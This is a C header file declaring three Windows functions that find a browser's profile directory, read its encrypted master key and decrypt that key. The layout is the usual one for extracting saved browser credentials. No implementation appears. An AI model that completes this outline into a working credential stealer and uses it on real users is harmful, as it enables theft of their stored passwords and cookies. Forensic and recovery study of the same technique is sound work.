#pragma once
#include <stdio.h>
#include <Shlobj.h>
#include <wchar.h>
#include <shlwapi.h>

BOOL get_browser_dir(GUID folder_id, PCWSTR browser_location, PWSTR buf_path, PSTR buf_outMsg, WORD buf_outSize);
BOOL get_encrypted_masterkey(PCWSTR browser_dir, PCWSTR data_file, PWCHAR enc_master_key, WORD enc_master_key_size, PSTR buf_outMsg, WORD buf_outSize);
BOOL decrypt_masterkey_and_ret(PWCHAR enc_master_key, PCHAR char_master_key, WORD enc_char_master_key_size, BCRYPT_KEY_HANDLE* p_handle_key, PSTR buf_outMsg, WORD buf_outSize);